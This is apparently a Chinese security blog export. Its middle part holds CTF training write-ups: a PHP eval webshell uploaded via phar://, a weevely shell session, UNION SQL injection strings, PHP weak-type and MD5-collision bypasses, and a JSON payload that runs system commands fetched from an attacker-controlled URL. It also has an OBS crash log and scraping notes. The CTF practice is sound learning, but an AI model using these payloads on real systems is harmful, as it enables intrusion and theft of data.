b3b448e23af49f7724f30ada829e8c3b79016fa32ffcae435aeb2cbbc6d211ddf7ae47f0443a911dbf4098b19824d3e9e9fbec0e09f195f838f86ed0a84eadc3d7e1bc61db44763999d8a4300aca784bd494b5fe2f6667ef335937e7591042200392acefa44adedac6b7b6965c026116b050b1a980202dcefe9ee6cbc738bb3a044a26d22babc44715a73857b995c26d2da323146f88eb9f7799fafd259e0c17b6aee6b2fb874ad5dd121bcf224090d9bf28bfaab7635fdf19e00652ac66d8cadb8214adabd21eafc75cd944ab15427b610df5d8be72531686ab7f44af802342f3e7e1614e39c0f1fedfd9d156effc1260bff39dde75635b54a3a5441d03112aad7cdefcb4eb7ba07dcae5cc48a314ef5888c2834639cf3abc970b6fc74791ba6d44882e88e4f47d3ea8e5f90cfd1d23c6e136d1659bcb458507126b9b1c232908823050df45afdd5d1c804c013ae0d4807f3daf22893f8bb5547c5f51a3b45e46c5464664a81f2f6f3f367d37b5ebde1f40e63c64a0702b96f7ec3a12d420b23410fe7dda2c1fd0dc090e2eb42350f04c6382f87a373774a797e0e5f9868e523db4e0bb6702d3ea8684d0bda8003239c49414b63e9bcacd0c12a3943132b46efdcddbcbdaf6085b48ff7a96f0e0f43053fc94ecaf790cdf82ee685d3ad840654600577866a0e4bf60ce5b9fda0c94ae57116d872c887b0bb3546fba64609151e7f8594cbee6bc956b83f6c0c19d0a2b9edeab7988fc5b44b5f943ca86ac86844dc871969e9f3836a5a9a3e2b5e0bfbbffefd10d69a5577e4188302a761d9fa642da40e039ab36d874cdcec3017b86d33ae153f5df235eb344ceca5d26c26fb71bca63ebdb7a69ba456b8c4de5082ba9ac1df3feda63cc200bfc6f0764d5ed701f24e3b4f8b49d055f332ab96742bed0ae749e339c1fa338f9c54dd8a8297e6714e27e40862f4311e699b73b9e16916fd488fe9336e36d54f6bed83cc2d48774a9cd959a5076203ab8f9096300e1828d524fd6b5b0d1616d1bc4d1f00e40e6b9ad20176840de308b75cefad8ef4afbdaeeb691d01b16d81ed154a36d63960040a83cf4f04305fbde8c369bd4ea44842fd4c569f3ef69c9fe71a84910e944141f30dd68aa5e176ecf1b7248b2b8c6b5a163596df995b09a7d3c0282256e32d8882b9ec97aa0e4d5d4b80c903342946340e2b377a75e74618e236abbc890a51f6a76f0f87d0d7d5ae82cb9e20777389404535f066b21b7a6f57df551b7e5341f0e5c72be3192e8cd290c16dabccf9cd19fcd0a6c032263bdc83b4d63ac68149c82dd2ed3eff4a4da097b25ac1d1bb6b84ab264898a53b01c9bae77b7f1e764b9e71aef5fdc46a52fe3914e25440b272d9c2f220607de09a488ce87d2597ebcb89dc60d1865e2aed97ddf835e5da876d4370138dbe3655e0fa8b97e940b218ad9170783fd572f9eb7b3fa0d96121e258873cce020e68de09c2b1dbb463cb6e06b599f2da3ffbf7f37d0a66cfe7dd8f260d4fdbab569b16a74769d90da03a5a20475bc63465c52b5893f18adbfa324717e3e0c67484786db9a95c2127429ef0af8e22a66f9eb35675aa588a3865aac5e34279345c45d9e71cc1cce7d319b88eb16882e115838a34c3a1dd43b4e46daba0821b9e696fa38e9993c0a6cf9712154bde2a83e71987919cbf45601231c76be8c73e1d41cd4cd9a4d0f822d3939cb920d10b3d1c51dedef72ea19f80d9cf282a5c29aec303d4fb68f3ed2e7a9463aa67f73cc3b1df4ade4a2a07d52d36dddd7d6c5d1c5c0c0f77f8f3387ce7bbd46d66d29d03aaa80ca3c88468fcb76e0dc2362abc6e2dea5fac98c44da8c9673725cfb9757cdbe5e5a903be905d8c20ceb15886afaffede7f0e4375bd103ff2c9673d71f6ba963f7ec6352ba258698ffa8672d62a7ed584062138dba3aeda3ee9d27ab5ef961e7ba093527cb79d42115d65de643876faf7770f6d93499bad91d28353d57d7b7dcf2f310bdf0198db590c42b3c15b77b4422a4b9363ff60b54c4ee99e4959d5fee6ff621158a94aecc7d6d294a9c6fca5d63d7cfe546f404730e23a5245618fcc7d0dc5f7bf25ee8f27bfaf90d4a2f269502a7f1cbb10d3b249a12c13e4d1b801644e0d27b8515e79e77bf62bf118306696702fec35eaa61c3a54a6d66849a36122bc91dc37684d09e2c4475b9b40beb830c7eb2f8434d9767573e27dd2e9bdd2ede654ea53d47a12c520c16459bcdb10a26fd24f9e2114384fc69fea321671c5b2ad46218e76e4784830bbaef5cce5028756d2dfa49c63d41f5e82d3a98ca5d16f3e38aebdaa4a8b232fdf8ea76ab8013363aaed631d5af93cdc153bb083d26a3a09e1b2efc73796b1ec3b42cc157b2d5668eae638e4a85d9d02a7cd2f08d413ee5bbf2bb29fe6dcd0aad81312b938702cc4c0b6a9d4de1b738b3a4e20fb8ffa7da704e4db7842554e7c3035ae0d3970193ae031963de1fa6142e08230bf0f3f10e310d4ddb74a3aea316ac1538d529e7d0d3ddbed5dc635efa4abad4eeb75e3833b33d5f206f98838f276f54cd4fc6cdf9ab88cadaf63c6204c4acdff8002c9f255dee54d05e197d4aec11031d8a0784bf83e6354c770f6a5f2fcb5347be2171d40940fad6050c65b5cf6490ee0c9cf870ccc54c0c3667e548a8c7fe7ccccba1a8bd47a52ed89f03f4b41e2184f056b1eb67fc137d782e9f0565875060ae31dcbd099412e5d6d5137037c67405e2283bca4f64e98f35622ebbcba210e1793557540306a5e0097bad48</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>二进制,pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>日常生活记录的漏洞点</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="obs-pwn"><a href="#obs-pwn" class="headerlink" title="obs_pwn"></a>obs_pwn</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">└──╼ <span class="variable">$obs</span> </span><br><span class="line">Attempted path: share/obs/obs-studio/locale/en-US.ini</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/locale/en-US.ini</span><br><span class="line">Attempted path: share/obs/obs-studio/locale.ini</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/locale.ini</span><br><span class="line">Attempted path: share/obs/obs-studio/themes/Dark.qss</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/themes/Dark.qss</span><br><span class="line">info: CPU Name: Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz</span><br><span class="line">info: CPU Speed: 3480.843MHz</span><br><span class="line">info: Physical Cores: 2, Logical Cores: 4</span><br><span class="line">info: Physical Memory: 11782MB Total, 3611MB Free</span><br><span class="line">info: Kernel Version: Linux 5.2.0-2parrot1-amd64</span><br><span class="line">info: Distribution: <span class="string">"Parrot GNU/Linux"</span> <span class="string">"4.7"</span></span><br><span class="line">info: Window System: X11.0, Vendor: The X.Org Foundation, Version: 1.20.4</span><br><span class="line">info: Portable mode: <span class="literal">false</span></span><br><span class="line">Attempted path: share/obs/obs-studio/themes/Dark/no_sources.svg</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/themes/Dark/no_sources.svg</span><br><span class="line">QMetaObject::connectSlotsByName: No matching signal <span class="keyword">for</span> on_advAudioProps_clicked()</span><br><span class="line">QMetaObject::connectSlotsByName: No matching signal <span class="keyword">for</span> on_advAudioProps_destroyed()</span><br><span class="line">QMetaObject::connectSlotsByName: No matching signal <span class="keyword">for</span> on_program_customContextMenuRequested(QPoint)</span><br><span class="line">info: OBS 0.0.1 (linux)</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: audio settings reset:</span><br><span class="line">	samples per sec: 44100</span><br><span class="line">	speakers:        2</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: Initializing OpenGL...</span><br><span class="line">info: Loading up OpenGL on adapter Intel Open Source Technology Center Mesa DRI Intel(R) HD Graphics 620 (Kaby Lake GT2) </span><br><span class="line">info: OpenGL loaded successfully, version 4.5 (Core Profile) Mesa 19.1.6, shading language 4.50</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: video settings reset:</span><br><span class="line">	base resolution:   1920x1080</span><br><span class="line">	output resolution: 1280x720</span><br><span class="line">	downscale filter:  Bicubic</span><br><span class="line">	fps:               30/1</span><br><span class="line">	format:            NV12</span><br><span class="line">	YUV mode:          601/Partial</span><br><span class="line">info: NV12 texture support not available</span><br><span class="line">info: Audio monitoring device:</span><br><span class="line">	name: Default</span><br><span class="line">	id: default</span><br><span class="line">info: ---------------------------------</span><br><span class="line">warning: Failed to load <span class="string">'en-US'</span> text <span class="keyword">for</span> module: <span class="string">'decklink-ouput-ui.so'</span></span><br><span class="line">libDeckLinkAPI.so: cannot open shared object file: No such file or directory</span><br><span class="line">info: No blackmagic support</span><br><span class="line">info: FFMPEG VAAPI supported</span><br><span class="line">info: VLC found, VLC video <span class="built_in">source</span> enabled</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info:   Loaded Modules:</span><br><span class="line">info:     vlc-video.so</span><br><span class="line">info:     text-freetype2.so</span><br><span class="line">info:     rtmp-services.so</span><br><span class="line">info:     obs-x264.so</span><br><span class="line">info:     obs-transitions.so</span><br><span class="line">info:     obs-outputs.so</span><br><span class="line">info:     obs-filters.so</span><br><span class="line">info:     obs-ffmpeg.so</span><br><span class="line">info:     linux-v4l2.so</span><br><span class="line">info:     linux-pulseaudio.so</span><br><span class="line">info:     linux-jack.so</span><br><span class="line">info:     linux-decklink.so</span><br><span class="line">info:     linux-capture.so</span><br><span class="line">info:     linux-alsa.so</span><br><span class="line">info:     image-source.so</span><br><span class="line">info:     frontend-tools.so</span><br><span class="line">info:     decklink-ouput-ui.so</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: ==== Startup complete ===============================================</span><br><span class="line">error: Service <span class="string">''</span> not found</span><br><span class="line">info: No scene file found, creating default scene</span><br><span class="line">info: All scene data cleared</span><br><span class="line">info: ------------------------------------------------</span><br><span class="line">info: pulse-input: Server name: <span class="string">'pulseaudio 13.0'</span></span><br><span class="line">info: pulse-input: Audio format: s16le, 44100 Hz, 2 channels</span><br><span class="line">info: pulse-input: Started recording from <span class="string">'alsa_output.pci-0000_00_1f.3.analog-stereo.monitor'</span></span><br><span class="line">info: pulse-input: Server name: <span class="string">'pulseaudio 13.0'</span></span><br><span class="line">info: pulse-input: Audio format: s16le, 44100 Hz, 2 channels</span><br><span class="line">info: pulse-input: Started recording from <span class="string">'alsa_input.pci-0000_00_1f.3.analog-stereo'</span></span><br><span class="line">info: Switched to scene <span class="string">'Scene'</span></span><br><span class="line">warning: Failed to glob scene collections</span><br><span class="line">Attempted path: share/obs/obs-studio/images/overflow.png</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/images/overflow.png</span><br><span class="line">info: adding 23 milliseconds of audio buffering, total audio buffering is now 23 milliseconds (<span class="built_in">source</span>: Mic/Aux)</span><br><span class="line"></span><br><span class="line">^Cinfo: ==== Shutting down ==================================================</span><br><span class="line">info: Switched to scene <span class="string">'(null)'</span></span><br><span class="line">info: pulse-input: Stopped recording from <span class="string">'alsa_output.pci-0000_00_1f.3.analog-stereo.monitor'</span></span><br><span class="line">info: pulse-input: Got 125 packets with 32338 frames</span><br><span class="line">info: pulse-input: Stopped recording from <span class="string">'alsa_input.pci-0000_00_1f.3.analog-stereo'</span></span><br><span class="line">info: pulse-input: Got 271 packets with 118520 frames</span><br><span class="line">info: All scene data cleared</span><br><span class="line">info: ------------------------------------------------</span><br><span class="line">double free or corruption (out)</span><br><span class="line">Aborted</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全训练</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="安恒训练赛"><a href="#安恒训练赛" class="headerlink" title="安恒训练赛"></a>安恒训练赛</h1><h2 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h2><p><a href="http://114.55.36.69:8009/index.php?url=upload" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=upload</a></p><p>upload很明显的文件上传，查了下是php伪协议<br>看到zip于是猜测是phar://伪协议读取。</p><p>于是写个小马打包成zip文件传上去。</p><p>例如我写的是south.php。</p><p>然后压缩成south.zip，那么需要访问以下链接。</p><a id="more"></a>



<?php
    @eval($_POST['south']);
    ?>

<p>upload/5a722d46033ecd25d5ce0f13a0e7d8ec.zip/south<br><a href="http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test</a><br>随后连接小马，读到flag{a5aa012546a729eebaeaa768883beb23}。</p>
<p>weevely generate <password> <path></path></password></p>
<p>weevely generate test  ./test.php<br>生成小马</p>
<p>然后压缩<br>zip test.zip test.php</p>
<p>然后上传得到了个路径<br>/var/www/html/upload/db29bc3f2a4be40c202cd7de760f41d6.zip<br>/upload/30a95552d102e69505b406933e4332f5.zip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/NoOne]</span><br><span class="line">└──╼ <span class="comment">#weevely http://114.55.36.69:8009/index.php?url=phar://upload/a382c5d906587c695f4408c0c7491560.zip/test test</span></span><br><span class="line">/usr/share/weevely/core/sessions.py:219: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please <span class="built_in">read</span> https://msg.pyyaml.org/load <span class="keyword">for</span> full details.</span><br><span class="line">  sessiondb = yaml.load(open(dbpath, <span class="string">'r'</span>).<span class="built_in">read</span>())</span><br><span class="line"></span><br><span class="line">[+] weevely 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Target:	c23cc37b6623:/var/www/html</span><br><span class="line">[+] Session:	/root/.weevely/sessions/114.55.36.69/index_4.session</span><br><span class="line">[+] Shell:	System shell</span><br><span class="line"></span><br><span class="line">[+] Browse the filesystem or execute commands starts the connection</span><br><span class="line">[+] to the target. Type :<span class="built_in">help</span> <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">weevely&gt; ls</span><br><span class="line">flag.php</span><br><span class="line">girl.jpg</span><br><span class="line">index.php</span><br><span class="line">upload</span><br><span class="line">upload.php</span><br><span class="line">c23cc37b6623:/var/www/html $ cat flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag&#123;a5aa012546a729eebaeaa768883beb23&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag</a></p>
<h2 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h2><p>简单的md5 <a href="http://114.55.36.69:8004" target="_blank" rel="noopener">http://114.55.36.69:8004</a></p>
<p>easy MD5 cracking</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--$_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>]--&gt;fail</span><br></pre></td></tr></table></figure>

<p>没有md5?应该是只有部分代码</p>
<p>脑补一下剩下的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(($_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>])</span><br><span class="line">&amp;&amp;(md5($_POST[<span class="string">'data1'</span>])==md5($_POST[<span class="string">'data2'</span>]))</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure>
<p>这里用php弱类型绕过就好了<br>传错类型会变成null，所以可以绕过</p>
<p><a href="https://zhuanlan.zhihu.com/p/30323499" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30323499</a></p>
<p>data1[]=1 &amp;&amp; data2[]=2</p>
<p>flag{401cf19d304e557349fecda18110c138}</p>
<h2 id="简单的新闻搜索"><a href="#简单的新闻搜索" class="headerlink" title="简单的新闻搜索"></a>简单的新闻搜索</h2><p>简单的新闻搜索网站 <a href="http://114.55.36.69:8010" target="_blank" rel="noopener">http://114.55.36.69:8010</a></p>
<p>小知识点：union需要前面的列数跟后面的列数相同，所以少了用数字补</p>
<p>burp</p>
<p>注入表名</p>
<p>word=1%’ union select 1,2,table_name from information_schema.tables where table_schema=database()–  &amp;number=5</p>
<p>注入得到列名</p>
<p>word=1%’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’admin’–  &amp;number=5</p>
<p>得到flag<br>word=1%’ union select 1,2,flag from admin–  &amp;number=5</p>
<h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。靶机：<a href="http://114.55.36.69:8022" target="_blank" rel="noopener">http://114.55.36.69:8022</a></p>
<p>当传入A.A、A[A或者A A时，PHP的$GET函数会自动将[.和空格转为_<br>这道题测试+也是可以绕过<br>数组大于任意的数字，字符串中如果没有数字，则==0</p>
<p>A.A[]=1</p>
<h2 id="md5-crack"><a href="#md5-crack" class="headerlink" title="md5 crack"></a>md5 crack</h2><p>fastcoll.exe -p 1.txt -o 1.bin 2.bin</p>
<p>py读取二进制流在urlencode一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">f1 = open(<span class="string">'1.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">f2 = open(<span class="string">'2.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'data1'</span>:f1,</span><br><span class="line">    <span class="string">'data2'</span>:f2</span><br><span class="line">&#125;</span><br><span class="line">print(urllib.parse.quote(f1))</span><br><span class="line">print(urllib.parse.quote(f2))</span><br><span class="line">flag = requests.post(<span class="string">"http://114.55.36.69:8006"</span>, data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>

<p>然后通过burp或者py都可以直接获得flag</p>
<p>这里用hackbar会变成二次url编码，然后会出问题</p>
<h2 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h2><p>word=%’and 1=2 /<em>!32302union</em>/ /<em>!32302select</em>/ 1,2,flag from admin#&amp;number=5</p>
<p>有点骚，这个操作，内联注释绕过，虽然不知道原理，还是学到了</p>
<p>注释是c语言注释格式/* */  !和数字，这个数字不能太小</p>
<p>。。flag不对。。</p>
<h2 id="玩个蛇皮"><a href="#玩个蛇皮" class="headerlink" title="玩个蛇皮"></a>玩个蛇皮</h2><p>玩个蛇皮 <a href="http://114.55.36.69:8011" target="_blank" rel="noopener">http://114.55.36.69:8011</a><br>简单js执行命令即可</p>
<h2 id="ddcms"><a href="#ddcms" class="headerlink" title="ddcms"></a>ddcms</h2><p>查看默认管理后端<br>弱口令，传小马，连上拿flag</p>
<p>1de3ce6607a0f95as1861c4bbb3687b8</p>
<h2 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;</span><br><span class="line">    $i = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg=='</span>;</span><br><span class="line">    <span class="keyword">echo</span> str_replace(<span class="string">'%id%'</span>, $h, base64_decode($i));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $j = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+'</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode($j);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码审计，发觉可以命令执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'ip地址'</span>.ljust(<span class="number">15</span>, <span class="string">'/'</span>)</span><br><span class="line">addr = <span class="string">'a'</span>*<span class="number">10</span> + ip[<span class="number">-10</span>:] + <span class="string">'b'</span>*<span class="number">10</span> + ip[:<span class="number">5</span>] + <span class="string">"c"</span>*<span class="number">10</span></span><br><span class="line">print(addr)</span><br><span class="line">print(len(addr))</span><br><span class="line">md5 = hashlib.md5(addr.encode(<span class="string">'ascii'</span>)).hexdigest()</span><br><span class="line">print(md5)</span><br><span class="line">http_addr = <span class="string">"http://"</span> + addr</span><br><span class="line">print(http_addr)</span><br></pre></td></tr></table></figure>




<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /upload/dama.php HTTP/1.1</span><br><span class="line">Host: 114.55.36.69:8020</span><br><span class="line">User-Agent:md5</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 64</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://114.55.36.69:8020/upload/dama.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">pass=aaaaaaaaaaxxxxxx///bbbbbbbbbbxxxxcccccccccc&amp;submit=submit</span><br></pre></td></tr></table></figure>


<p>部署在服务器上，默认以80端口，这样就不用index.php了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"f"</span>=&gt;<span class="string">"system"</span>,</span><br><span class="line">    <span class="string">"d"</span>=&gt;<span class="string">"cat ../flag.php"</span></span><br><span class="line">);</span><br><span class="line">$url = json_encode($url);</span><br><span class="line"><span class="keyword">echo</span> $url;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web安全</category>
        <category>练习</category>
      </categories>
      <tags>
        <tag>web安全,练习</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全学习</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>john –format=raw-MD5 1.txt<br>破解hash值</p><p>二次执行<br>删除 ~/.john</p><p>john –format=raw-MD5 1.txt –show 可以展示以前破解的密码</p>]]></content>
      <categories>
        <category>web安全</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>web安全,sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫学习1</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="爬虫第一天"><a href="#爬虫第一天" class="headerlink" title="爬虫第一天"></a>爬虫第一天</h1><h2 id="关于内容的思考"><a href="#关于内容的思考" class="headerlink" title="关于内容的思考"></a>关于内容的思考</h2><p>书里有两处遗漏</p><ol>
<li><p>正则匹配不当</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">link_craw(<span class="string">'http://example.python-scraping.com'</span>, <span class="string">'/places/default/(index|view)'</span>,user_agent=<span class="string">'BadCrawler'</span>)</span><br></pre></td></tr></table></figure>
<p>这里应该是/place/default/这样的格式，因为re.match只匹配开头串，前面重复的部分也要写上</p>
</li>
<li><p>在requests这里讲解的时候代码少了个return html</p>
</li>
</ol><a id="more"></a>

<h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def download(url, user_agent='wswp', robots=None, num_retries=5, proxies=None):</span></span><br><span class="line"><span class="string">    print("Downloading:", url)</span></span><br><span class="line"><span class="string">    headers = &#123;'User-Agent': user_agent&#125;</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        resp = requests.get(url, headers=headers, proxies=proxies)</span></span><br><span class="line"><span class="string">        html = resp.text</span></span><br><span class="line"><span class="string">        # print(html)</span></span><br><span class="line"><span class="string">        if resp.status_code &gt;= 400:</span></span><br><span class="line"><span class="string">            print("Downloading error:", 